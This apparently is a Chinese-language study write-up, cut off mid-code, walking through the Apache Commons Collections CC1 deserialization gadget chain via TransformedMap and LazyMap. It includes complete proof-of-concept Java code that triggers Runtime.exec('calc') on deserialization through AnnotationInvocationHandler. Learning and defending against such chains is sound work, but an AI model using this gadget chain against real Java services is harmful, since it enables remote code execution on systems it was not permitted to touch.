TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 put 方法时），就会触发相应参数的 Transformer 的 transform() 方法。\nLazyMap org.apache.commons.collections.map.LazyMap与TransformedMap类似，这个类触发transform()方法的点就在于调用get()方法时传入的key不存在，看一下get()方法的源码：\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 再看下面：\n可以知道LazyMap类继承于AbstractMapDecorator。\norg.apache.commons.collections.map.DefaultedMap与LazyMap具有相同功能，同样是get()方法会触发transform 方法。\nTransformer org.apache.commons.collections.Transformer是一个接口类，源代码如下：\n1 2 3 4 5 package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); } 它提供了一个transform()方法，用来定义具体的转换逻辑。\n在Commons Colection 项目中，程序提供了21个Transformer 的实现类，用来实现不同的对TransformedMap 中的 key/value 进行修改的功能\n重点关注几个实现类\nInvokerTransformer org.apache.commons.collections.functors.InvokerTransformer，这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，来看一下它的transform方法源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException var6) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException var7) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, var7); } } } 重点就是try部分代码：\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); 这里使用反射获取方法并使用invoke()方法调用这个方法，看看这里需要利用的几个参数：\n1 2 3 private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; 赋值方法也在构造函数里面，如下：\n1 2 3 4 5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } 尝试自己构造，测试代码：\n1 2 3 4 5 6 7 8 9 10 package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.Runtime; public class Test { public static void main(String[] args) { InvokerTransformer x = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); x.transform(Runtime.getRuntime()); } } 成功弹出计算机： ChainedTransformer org.apache.commons.collections.functors.ChainedTransformer类也是Transformer的实现类，关键源码如下：\n1 2 3 4 5 6 7 8 9 10 11 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } 这里的重点就是这个类自己维护了一个Transformer数组，在调用ChainedTransformer的transform方法时，会循环数组，依次调用 Transformer 数组每个 trandform方法，并将结果传递给下一个 Transformer。\n这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。\nConstantTransformer org.apache.commons.collections.functors.ConstantTransformer是返回一个固定常量的Transformer，在初始化时储存了一个Object，后续的调用会直接返回这个Object。关键源码如下：\n1 2 3 4 5 6 7 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } 这个类用于和ChainedTransformer配合，将其结果传入InvokerTransformer来调用我们指定的类的指定方法。\n攻击构造 CC1这里有两条链可以利用，分别是利用TransformedMap类和LazyMap类，现在来分别说明一下。\nTransformedMap链 基本本地代码 这里就结合到前面知识点，来构造反序列化的恶意利用代码。现在我们构造的最终的利用点，就是Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)，在这里使用TransformedMap 触发，本地demo如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); } } 说明一下这串代码的作用，先说后面的利用代码：\n1 2 3 HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); 这部分代码只要理解到了前面在TransformedMap类部分给的示例代码基本就可以理解了。所以链子起始点就是\n现在来看流程，打断点如下：\n然后就继续跟进，由于我们传入的keyTransformer就是ChainedTransformer类对象，所以这里调用的transform()方法时，调用的就是ChainedTransformer类的transform()方法，如下：\n现在来看我们给ChainedTransformer类传入的数组：\n1 2 3 4 5 6 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); //注意理解 1.然后现在就是调用的传入的数组第一个参数的transform方法，即ConstantTransformer类的transform()方法（此时的object为10）：\n这里的transform方法会直接返回我们实例化时定义的Runtime.class，所以这里的10最终是没用的，这步过后object的值变为了Runtime对象，即class java.lang.Runtime。\n2.然后现在调用的就是数组第二个值的类实例化对象，也就是\n1 new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}) 继续跟进\n注意看input.getClass()这一步过后的cls的值，居然变成了Class对象，这也是最开始没想通的（这里的Input不是一个类的实例化对象），也就是对任何类的class对象使用getClass()方法时都会返回class java.lang.Class。\n然后这里调用getMethod()方法获取Class对象的getMethod()方法并在return的地方使用invoke()方法来获取Runtime类的getRuntime()方法（getRuntime方法为静态方法）\n所以现在的object变为Runtime里面的getRuntime()方法。\n3.继续，现在到了第三个值的类实例化对象，也就是：\n1 new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}) 还是进入InvokerTransformer类的transform方法\n这里需要注意的同样的是getClass()那里，由于我传入的是一个getRuntime()方法的class对象，所以这里返回的是class java.lang,reflect.Method，然后使用反射获取Method类中的invoke方法，最后再在return部分调用invoke方法来利用反射获取的invoke()方法，形如：\n1 2 3 4 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //这样就可以直接执行方法从而获取Runtime类的实例化对象，还是和这个方法是static有关 所以在这里应该就是相当于直接执行getRuntime()方法（注意理解对比反射的知识点，这里的的用法需要理解记忆）\n所以在这一步后可以获取到new Runtime的实例。\n即现在的object的值为Runtime类的实例\n4.现在就到了数组的最后一个值，即：\n1 new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) 然后后面就是获取Runtime类的exec方法，并在invoke时传入calc弹出计算机。\n5.总结\n最后简单总结一下chain链中的流程：\n使用ConstantTransformer的transform方法返回Runtime.class 再在InvokerTransformer的transform方法获取getMethod方法并利用获取getRuntime()方法 再在InvokerTransformer的transform中获取invoke方法来调用getRuntime()方法从而获取到Runtime类实例。 最后还是在InvokerTransformer的transform方法获取到exec方法并传入calc弹出计算机 分析结束。\n其实还可以更简单，结合getRuntime()方法的特性，可以如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; class Test{ public static void main(String[] args){ ChainedTransformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(\u0026#34;exec\u0026#34; , new Class[]{ String.class },new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map ctf =TransformedMap.decorate(hashMap,chain,null); ctf.put(10,\u0026#34;xxx\u0026#34;); } } 同样成功弹出计算机\n综上第二种的简化代码更简洁，第一种偏技巧性，都要理解学习利用。\n但是第二种代码本身在具体的运用中并没有用，这是因为Runtime类并没有实现Serializable接口，而解决方法就是第一种，所以在实际运用中还是使用的第一种。\n实际利用 上面的代码只是一个用来在本地测试的类，并且是我们通过构造代码来启用第一个transform()方法继而实现的链子。在实际反序列化漏洞中，我们需要它的readObject代码逻辑中有类似Map.put方法的操作。\n在这里可以利用到的类就是sun.reflect.annotation.AnnotationInvocationHandler。\n现在来看这个类的readObject()方法（需要注意的是这是8u71以前的代码，8u71以后做了一些修改，这个后面再说）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } 重点关注foreach语句。在这里Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()用于遍历Map，可以参考这个文章，而String name = memberValue.getKey();语句和Object value = memberValue.getValue();语句用于获取键值对。\n这里的重点就是这个setValue()方法了，这里简单给出这个调用链：\n1 AnnotationInvocationHandler#readObject() ==\u0026gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==\u0026gt;TransformedMap#checkSetValue 在TransformedMap这里就可以启动前面构造的调用链\n同时在这里可以看出是利用的valueTransformer，所以在调用decorate()方法初始化时要不同于前面的基本代码，需要改位置，如下：\n1 Map map2 = TransformedMap.decorate(hashMap,null,chain); 这样才能保证成功调用。现在就围绕这条链子来进行阐述。\n1.现在来看memberValues的赋值点：\n这里由于AnnotationInvacationHandler属jdk内部类，无法直接引用且被实例化，所以只能利用反射获取构造方法，将修饰过的Map添加进去。\n注意看AnnotationInvacationHandler的构造方法，简单说明一下参数问题：\n对于第一个参数Class\u0026lt;? extends Annotation\u0026gt; type，简单说明一下：形如**\u0026lt;？ extends Collection\u0026gt;** 这里**？代表一个未知的类型，但是，这个未知的类型实际上是Collection**的一个子类，Collection是这个通配符的上限。\n同时看这个构造方法里面的 if 语句代码，这里只要满足任何一个条件就会进入到if语句，导致不能正常赋值。这里重点关注!type.isAnnotation()代码，这里的isAnnotation()函数就是用来判断Class对象是否是表示一个注解类型。所以这里需要一个传入一个注解类型的Annotation。也就是下图中有@的类：\n选择上面的任意一个注解类型的类应该都是可以的\n所以可以构造代码如下：\n1 2 3 4 5 Class clazz = Clas.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDelaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); constructor1.newInstance(Rention.class,ctf); //ctf即构造好的TransformedMap 现在解决了memberValues值的问题。\n2.继续看readObject()方法的源码\n为了方便学习，我们尝试直接拼接一下前面的总结出来的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 再打断点调试发现是在readObject()地方出现问题，现在来跟一下readObject()的源码，打断点如下：\n先来看这两串代码：\n1 2 3 annotationType = AnnotationType.getInstance(type); 和 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); 简单看看结果：\n第一行代码将annotationType被赋值为了AnnotationType实例，所以第二行代码就会调用AnnotationType类的memberTypes()方法:\n所以最终readObject()方法里面的memberTypes为HashMap类的实例。\n这里还要说明一个点，关于for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())这个循环遍历的代码问题，在打断点过程中，我发现如下打断点会直接结束：\n那就说明在我上面拼接的代码在反序的时候并没有成功进入到这个for语句中，我猜测是这个循环遍历的问题，去查看前面给的文章的举例代码，直接看测试代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;value1\u0026#34;); map.put(2, \u0026#34;value2\u0026#34;); map.put(3, \u0026#34;value3\u0026#34;); map.put(4, \u0026#34;value4\u0026#34;); map.put(5, \u0026#34;value5\u0026#34;); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } 成功输出\n但是当我使用如下代码测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.util.Map; import java.util.HashMap; public class reflect { public static void main(String[] args) throws Exception { Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (Integer key : map.keySet()) { System.out.println(\u0026#34;key: \u0026#34; + key + \u0026#34; value: \u0026#34; + map.get(key)); } System.out.println(); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } } 却什么都没有，这个结果那就确实说明了*我们需要向Map中键入至少一对键值对才能成功进入到这个for循环。*后续有个问题，直接讲了：\n这里看readObject()源码，可以知道需要将这个值设置为String那么测试代码就可以改成如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;ceshi\u0026#34;,\u0026#34;value1\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 再调试成功进入for循环，但是并没有成功弹出计算机，那么继续打断点，如下打断点时会直接退出\n说明并没有进入这个if条件，那么现在重点关注memberType的赋值语句：\n再在if语句打一个断点，此时值的情况为：\n那么现在看一下这个调用的get方法，前面已经说过了memberTypes为HashMap类实例，那现在就看HashMap类的get方法，源码如下：\n1 2 3 4 public V get(Object key) { Node\u0026lt;K,V\u0026gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } 那现在再如下打断点：\n调试跟进，发现最终其作用的点就是getNode()方法，这个方法会在哈希表中查找对应的节点，如果相匹配就会返回对应的节点，比如如果匹配到我设置的ceshi键和值value1，那么就会返回对应节点，否则就会返回null。\n后续的如何匹配就是注释相关技术了，在这里想要成功通过的条件为：\nsun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 那么被TransformedMap.decorate修饰的Map中必须有一个键名为X的元素 所以在这里我们需要将键设置为value，因为注解类有名为value的方法： 所以最终的可利用的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxx\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //序列化 serialize(o); //反序列化 unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } 成弹出一个计算机。\n现在来看一下setValue()方法后续调用的方法的源码：\n然后就是TransformedMap类的checkSetValue()方法： 由于我们前面就将valueTransformer设置为了chain链，所以后续都会往预估方向发展，具体过程可以参考前面的基础代码部分。\n——————————\n然后总结一下前面的问题：\n还是要注意一下Runtime类不能实例化的问题 反射获取AnnotationInvocationHandler类 进入for循环的需要put键值对的问题 if条件的进入条件 在拉通整个过程时的调试过程中遇到的问题：\n暂时对于很多都是初步了解吧，跟源码其实还有点看不懂，后面再来看看，简单给出示例代码，也许可以在调试过程中更容易理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); try { for (Map.Entry\u0026lt;String, String\u0026gt; entry : outerMap.entrySet()) { System.out.println(\u0026#34;成功进入循环遍历\u0026#34;); System.out.println(entry); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } catch (Exception e) { e.printStackTrace(); } } } 打断点如下：\n看此时的值： 然后再看上面的实例代码给出的结果：\n暂时就通过实例来稍微理解一下，看这个entry的值，前面所属就是AbstractInputCheckedMapDecorator$MapEntry（主要就是这里所属为什么是这个还有点不清楚），这样也就能够说明为什么readObject()方法中在调用setValue()方法时会到这个MapEntry类（就算直接在readObject方法打断点所属还是这个），从而导致整条链子的执行。\nLazyMap链 实际上，在ysoserial链中，它利用的并不是TransformedMap，而是利用的LazyMap。\n分析及构造过程 LazyMap的漏洞触发点是它的get()方法get方法，也就是get方法源码中的factory.transform()。也就是LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用factory.transform方法去获取一个值：\n1 2 3 4 5 6 7 8 9 10 public Object get(Object key) { if (!this.map.containsKey(key)) { //审代码如果传入的key不存在，就会才会进入这个if条件 Object value = this.factory.transform(key); this.map.put(key, value); return value; } else { return this.map.get(key); } } 相较于TransformedMap链的利用方法，LazyMap的利用更复杂一些，由于sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中没有调用到Map的get方法。但是AnnotationInvocationHandler类的invoke方法有调用到get方法，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(\u0026#34;Too many parameters for an annotation method\u0026#34;); switch(member) { case \u0026#34;toString\u0026#34;: return toStringImpl(); case \u0026#34;hashCode\u0026#34;: return hashCodeImpl(); case \u0026#34;annotationType\u0026#34;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } 那么如何调用到AnnotationInvocationHandler#invoke呢？这里就可以利用到动态代理。\n现在先回到LazyMap的get()方法源码，重点分析一下if语句：\n1 2 3 4 5 6 7 public Object get(Object key) { if (!this.map.containsKey(key)) { //审代码如果传入的key不存在，就会才会进入这个if条件 Object value = this.factory.transform(key); this.map.put(key, value); return value; } 来看进入if语句的条件，this.map.containsKey(key)就是看键值表中是否有这个key，在这里需要没有这个key才能进入if条件；那么这个key对应的invoke中的代码就是String member = method.getName(); 学过动态代理的话就知道这里的member对应的就是代理对象调用的方法名，一般在一个java对象中都不会有一个以方法名为键的键值对，所以一般这里的if条件其实是可以忽略的。然后我想了一下，如果我认为设置一个键值对的键就是代理对象要调用的方法名称，那么是否应该不会继续下去。理论上是个人感觉是可以的，后面实践一下。\n——\n现在继续链子的说明\n前面说到了需要用动态代理，所以这里需要用到java.lang.reflect.Proxy以及InvocationHandler接口\n在这里AnnotationInvocationHandler实现了InvocationHandler接口并重写了invoke方法，符合基本条件。\n看代码所需的对象，这里就看看在哪些地方需要注意： 首先就是AnnotationInvocationHandler#invoke中调用get()的地方，memberValues.get(member);，所以这里的membervalues需要为LazyMap类对象，所以我们可以如下构造：\n1 2 3 4 Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstroctor(Class.class,Map.class); constroctor1.setAccessible(true); object o = constructor1.newInstance(Retention.class,outerMap); 现在再来看一下outerMap的内容，现在首先就需要看一下LazyMap的构造方法等，稍微看一下源码，可以知晓我们利用到的代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } } 所以我们可以如下构造：\n1 2 3 4 Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Transformer outerMap = LazyMap.decorate(hashMap,chain); 再将前面综合一下，就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new 